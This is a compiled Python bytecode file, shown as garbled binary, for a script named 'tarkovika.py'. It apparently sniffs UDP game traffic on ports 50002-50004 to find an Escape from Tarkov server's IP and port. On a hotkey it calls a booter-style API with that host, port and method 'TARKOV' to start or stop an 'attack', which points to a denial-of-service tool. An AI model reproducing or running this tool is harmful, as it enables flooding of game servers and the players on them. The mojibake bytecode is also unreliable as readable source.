a

    3|Ãa  Ã£                   @   s(  d dl T d dlmZmZ d dlmZ d dlmZ d dlmZ d dlZd dl	Z	d dl
Z
d dlZd dlZd dl
Z
d dlZdadad ad	ad
ZdZdad adadadae
jdg d
Â¢dÂ e
jddâ€ž Æ’Zddâ€ž Ze
jddâ€ž Æ’Ze
jddâ€ž Æ’Ze
jd"ddâ€žÆ’Z ddâ€ž Z!ddâ€ž Z"ddâ€ž Z#dd â€ž Z$e%d!kÂr$e$Æ’  dS )#Ã©    )Ãš*)ÃšKeyÃšListener)Ãšpprint)Ãšdatetime)ÃšProcessNz'http://127.0.0.1/api/v1/tarkov?key=1337z0.0.0.0FÃšyÃšuZgui)z.htmlz.jsz.ico)Zallowed_extensionsc                 C   s^   | t  jddâ€¦ }| t  j}| t j}|dkrZ|tkrZ|a|atÂ ||Â¡ tdÂ 	||Â¡Æ’ d S )Nr   Ã©   z192.168z New IP address detected: {0}:{1})
ZIPZdstZUDPZdportÃš	currentIPÃšcurrentPortÃšeelÃšsetCurrentIPÃšprintÃšformat)ÃšdataZlocalÃšipÃšportÂ© r   Ãºtarkovika.pyr      s    

r   c                 C   sl   |dkr| a |ad}nd}tÂ dÂ tt t|Â¡Â¡}tÂ |jÂ¡}|d dkrXt	|d Æ’ dS t	|d Æ’ dS d S )	NÃšstartZTARKOVZSTOPz {0}&host={1}&port={2}&method={3}ZsuccessTÃšmessageF)
ÃšcurrentAttackingIPÃšcurrentAttackingPortÃšrequestsÃšgetr   ÃšapiUrlÃšjsonÃšloadsÃštextr   )r   r   ÃšactionÃšmethodÃšhandler   r   r   ÃšhandleAttack*   s    r#   c                 C   sÅ½   t | dÆ’rÅ | jtkrxtrHtttdÆ’}|dkrvdatÂ dÂ¡ t	Â 
ddÂ¡ qÅ tttdÆ’}|dkrÅ datÂ dÂ¡ t	Â 
ddÂ¡ n| jt
krÅ tdÆ’ d S )	NÃšcharÃšstopTFÃ©   iÃ´  r   Ã©   )Ãšhasattrr$   Ãš	attackKeyÃšisAttackingr#   r   r   r
   Ãš	setStatusÃšwinsoundZBeepr   r   ÃšsniffKeyÃš
startSniffing)ÃškeyZresponser   r   r   Ãšon_press>   s    




r0   c                 C   sB   | t jkr>tttdÆ’ tttdÆ’ tÂ dÂ¡ t	dÆ’ t
Æ’  dS d S )Nr%   r&   z1User forced to stop atacks and close application.F)r   Zescr#   r   r   r   r   r
   r+   r   Ãš
supervisor)r/   r   r   r   Ãš
on_releaseR   s    

r2   c                 C   s(   | st dÆ’ nt dÆ’ tdtddÂ d S )NzSniffing startedzRe-sniffing startedzudp and portrange 50002-50004Ã©   )ÃšfilterZstop_filterÃšcount)r   Zsniffr   )Ãšuserr   r   r   r.   _   s    
r.   c                   C   s0   t Â Â¡  tÂ dÂ¡ tÂ Â¡  tÂ dÂ¡ tÂ Â¡  d S )Ng333333Ã“?)Ãšthread1ÃškillÃštimeÃšsleepÃšthread2Ãšthread3r   r   r   r   r1   i   s
    

r1   c                  C   s8   t ttdÂÂ} | Â Â¡  W d   Æ’ n1 s*0    Y  d S )N)r0   r2   )r   r0   r2   Ãšjoin)Zlistenerr   r   r   ÃšstartListeningr   s    r>   c                   C   s   t jdddÂ d S )Nzgui.html)i,  Ã©Ãˆ   )Ãšsize)r
   r   r   r   r   r   ÃšstartGuiu   s    rA   c                   C   s6   t dÆ’ ttdÂÂ Â¡ attdÂÂ Â¡ attdÂÂ Â¡ ad S )Nz[THREAD] Starting threads)Ãštarget)	r   r   rA   r   r7   r.   r;   r>   r<   r   r   r   r   Ãš
threadedStartx   s    rC   Ãš__main__)F)&Z	scapy.allZpynput.keyboardr   r   r   r   Zmultiprocessingr   Ãš	functoolsr   r,   r   r9   r
   Zrandomr   r   r   r*   r)   r-   r   r   r7   r;   r<   ÃšinitZexposer   r#   r0   r2   r.   r1   r>   rA   rC   Ãš__name__r   r   r   r   Ãš<module>   sL   



		

